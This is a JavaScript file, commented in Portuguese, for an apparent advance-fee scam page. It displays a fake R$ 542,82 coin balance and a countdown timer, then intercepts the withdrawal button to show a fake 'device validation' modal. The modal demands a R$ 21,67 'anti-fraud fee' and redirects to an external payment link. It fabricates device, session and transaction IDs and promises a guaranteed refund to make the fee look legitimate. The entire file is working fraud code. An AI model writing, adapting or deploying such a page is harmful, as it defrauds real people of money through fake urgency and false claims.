// CONFIGURAÇÕES GERAIS
const VALOR_SALDO = 542.82;

// --- 1. FUNÇÕES UTILITÁRIAS (X-9 E DADOS) ---

// Função para detectar o modelo do celular (O DEDO DURO)
function getMobileModel() {
    var ua = navigator.userAgent;
    if (/android/i.test(ua)) {
        var match = ua.match(/Android.*?; (.*?)( Build|\)|;)/);
        return match && match.length > 1 ? match[1].trim() : "Android System (Verified)";
    }
    if (/iPad|iPhone|iPod/.test(ua)) {
        var match = ua.match(/OS (\d+)_/);
        var version = match ? match[1] : "";
        return "Apple iPhone " + (version ? "(iOS " + version + ")" : "(Secured)");
    }
    return "Windows/Desktop Client";
}

// Gera ID de sessão aleatório
function generateSessionID() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let result = '';
    for (let i = 0; i < 8; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

// --- 2. INTERAÇÃO DA PÁGINA ---

// Função GLOBAL para selecionar o valor (chamada pelo HTML)
window.selectAmount = function (element) {
    document.querySelectorAll('.amount-btn').forEach(btn => {
        btn.classList.remove('border-primary', 'text-primary', 'bg-white', 'shadow-[0_0_0_4px_rgba(254,44,85,0.1)]', 'scale-105');
        btn.classList.add('border-transparent', 'text-gray-900', 'bg-gray-50');
        btn.style.transform = 'scale(1)';
    });

    element.classList.remove('border-transparent', 'text-gray-900', 'bg-gray-50');
    element.classList.add('border-primary', 'text-primary', 'bg-white', 'shadow-[0_0_0_4px_rgba(254,44,85,0.1)]', 'scale-105');

    element.style.transform = 'scale(1.05)';
    setTimeout(() => { element.style.transform = 'scale(1)'; }, 200);
}

// --- 3. INICIALIZAÇÃO (QUANDO A PÁGINA CARREGA) ---
document.addEventListener('DOMContentLoaded', () => {

    // Timer de Urgência
    const timerEl = document.getElementById('expira-timer');
    if (timerEl) {
        let duration = 120; // 2 minutos
        const interval = setInterval(() => {
            let minutes = Math.floor(duration / 60);
            let seconds = duration % 60;
            timerEl.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            if (--duration < 0) {
                clearInterval(interval);
                timerEl.textContent = '00:00';
                timerEl.classList.add('animate-pulse', 'text-red-600');
            }
        }, 1000);
    }

    // Atualiza saldo na tela
    const saldoEl = document.getElementById('saldo-disponivel');
    if (saldoEl) saldoEl.innerHTML = `R$ ${VALOR_SALDO.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}`;

    const saqueEl = document.getElementById('valor-saque');
    if (saqueEl) saqueEl.textContent = VALOR_SALDO.toLocaleString('pt-BR', { minimumFractionDigits: 2 });

    // Detecta o botão de sacar (lógica inteligente)
    const botoes = document.querySelectorAll('button');
    const btnSacar = Array.from(botoes).find(btn =>
        btn.textContent.trim().toLowerCase().includes('sacar dinheiro') ||
        btn.classList.contains('bg-primary')
    );

    if (btnSacar) {
        btnSacar.onclick = function (e) {
            e.preventDefault();
            showUrgentAlert(); // CHAMA O MODAL AQUI
        };
    }
});

// --- 4. O MODAL MONSTRO (AQUI TAVA O ERRO, AGORA TÁ FIXADO) ---
function showUrgentAlert() {
    // Remove modal anterior se houver
    const old = document.getElementById('alert-overlay');
    if (old) old.remove();

    // Dados dinâmicos
    const deviceModel = getMobileModel();
    const sessionID = generateSessionID();
    const hash = "TRX-" + Math.floor(Math.random() * 9999) + "-HK";

    // Cria o elemento
    const overlay = document.createElement('div');
    overlay.id = 'alert-overlay';
    overlay.className = 'fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm px-4';

    // HTML DO MODAL
    overlay.innerHTML = `
        <div class="bg-white rounded-3xl shadow-2xl w-full max-w-sm mx-4 text-center transform transition-all scale-100 relative overflow-hidden font-sans border border-gray-200">
            
            <div class="bg-[#121212] py-3 px-5 flex items-center justify-between border-b border-gray-800 relative z-10">
                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTcmhxbA57vFy1TRyP8fZbluKDkTrG_oDkneg&s" class="h-5 brightness-200 grayscale contrast-125">
                <div class="flex items-center gap-2">
                    <span class="text-[10px] text-green-500 font-mono tracking-widest uppercase">Identity_v9.0</span>
                    <span class="relative flex h-2 w-2">
                      <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
                      <span class="relative inline-flex rounded-full h-2 w-2 bg-green-500"></span>
                    </span>
                </div>
            </div>

            <div class="p-6 relative">
                <div class="absolute top-0 left-0 w-full h-32 bg-gradient-to-b from-gray-50 to-transparent -z-10"></div>

                <div class="relative mx-auto w-32 h-32 mb-4 group">
                    <img src="https://cdn3d.iconscout.com/3d/free/thumb/free-moeda-tiktok-com-estrela-piscante-3d-icon-png-download-6220600.png" class="w-full h-full object-contain drop-shadow-xl animate-[bounce_3s_infinite]">
                    <div class="absolute bottom-2 -right-2 bg-white/95 backdrop-blur rounded-2xl p-1.5 px-2.5 shadow-lg border border-red-100 flex items-center gap-1.5 animate-pulse">
                        <div class="bg-red-500 p-1 rounded-full">
                             <svg class="w-3 h-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
                        </div>
                        <span class="text-[10px] font-bold text-red-600 uppercase tracking-tight">Bloqueado</span>
                    </div>
                </div>

                <div class="mb-5">
                    <div class="inline-flex items-center gap-1.5 bg-yellow-50 border border-yellow-200 px-2 py-1 rounded mb-2">
                        <svg class="w-3 h-3 text-yellow-600" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/></svg>
                        <p class="text-[10px] font-mono font-bold text-yellow-700 uppercase">Status: 403_DEVICE_CHECK</p>
                    </div>
                    <h2 class="text-gray-900 text-2xl font-black leading-none mb-2">VALIDAÇÃO NECESSÁRIA</h2>
                    <p class="text-gray-500 text-xs font-medium leading-relaxed px-2">
                        Para liberar <b class="text-gray-900">R$ ${VALOR_SALDO.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</b>, confirme que você é o titular real pagando a Taxa Antifraude.
                    </p>
                </div>

                <div class="bg-white border-l-4 border-primary shadow-lg rounded-r-xl p-0 mb-5 relative overflow-hidden flex flex-col">
                    <div class="p-3 flex items-center justify-between relative z-10 border-b border-gray-100">
                        <div class="absolute right-0 top-0 h-full w-20 bg-gradient-to-l from-red-50 to-transparent opacity-50"></div>
                        <div class="text-left z-10">
                            <p class="text-[10px] text-gray-400 font-bold uppercase tracking-wider">Taxa Única</p>
                            <p class="text-gray-900 font-mono text-xs font-bold tracking-tight">${hash}</p>
                        </div>
                        <div class="text-right z-10">
                            <span class="block text-3xl font-black text-primary tracking-tight">R$ 21,67</span>
                        </div>
                    </div>
                    <div class="bg-gray-100 px-3 py-2 flex flex-col gap-1 text-left">
                        <div class="flex justify-between items-center border-b border-gray-200/50 pb-1">
                            <div class="flex items-center gap-1.5">
                                <svg class="w-3 h-3 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>
                                <span class="text-[9px] text-gray-500 font-bold uppercase">Dispositivo:</span>
                            </div>
                            <span class="text-[9px] text-gray-800 font-mono font-bold uppercase truncate max-w-[150px]">${deviceModel}</span>
                        </div>
                        <div class="flex justify-between items-center pt-1">
                            <div class="flex items-center gap-1.5">
                                <svg class="w-3 h-3 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5.121 17.804A13.937 13.937 0 0112 16c2.5 0 4.847.655 6.879 1.804M15 10a3 3 0 11-6 0 3 3 0 016 0zm6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                                <span class="text-[9px] text-gray-500 font-bold uppercase">User ID:</span>
                            </div>
                            <span class="text-[9px] text-green-600 font-mono font-bold">USER-${sessionID}-BR</span>
                        </div>
                    </div>
                </div>

                <div class="bg-[#ECFDF5] border border-[#10B981] rounded-xl p-3 mb-5 flex items-start gap-2.5 shadow-sm">
                    <div class="bg-[#10B981] p-1 rounded-full shrink-0 mt-0.5">
                        <svg class="w-2.5 h-2.5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>
                    </div>
                    <p class="text-[#065F46] text-[11px] font-bold text-left leading-tight">
                        REEMBOLSO GARANTIDO: A taxa valida sua identidade e será devolvida junto com o saque!
                    </p>
                </div>

                <button id="modal-go-saque" class="w-full bg-primary hover:bg-[#e6284d] text-white font-bold py-3.5 rounded-xl text-lg shadow-lg shadow-primary/30 transition-all active:scale-95 flex items-center justify-center gap-2 group">
                    <span>CONFIRMAR E SACAR</span>
                    <svg class="w-5 h-5 group-hover:translate-x-1 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                </button>

                <div class="mt-4 flex flex-col items-center gap-1 opacity-60">
                    <p class="text-[8px] text-gray-400 uppercase tracking-widest">Validação Biométrica Digital</p>
                    <img src="https://d3ugyf2ht6aenh.cloudfront.net/stores/001/675/550/themes/amazonas/img-1922006266-1679250880-d974b9570d119e845771e0a10c07d6cc1679250880.png?821375030" class="h-6 object-contain grayscale">
                </div>
            </div>
        </div>
    `;

    // 1. INSERE O MODAL NO DOM
    document.body.appendChild(overlay);

    // 2. SÓ DEPOIS DE INSERIR, BUSCA O BOTÃO DENTRO DO MODAL
    const btnModal = document.getElementById('modal-go-saque');

    // 3. ADICIONA O EVENTO (AGORA O BOTÃO EXISTE, NÃO VAI DAR NULL)
    if (btnModal) {
        btnModal.onclick = () => {
            window.location.href = 'https://pay.sunize.com.br/ylxxHfvm';
        };
    }

    // Fecha ao clicar fora
    overlay.onclick = (e) => {
        if (e.target === overlay) overlay.remove();
    };
}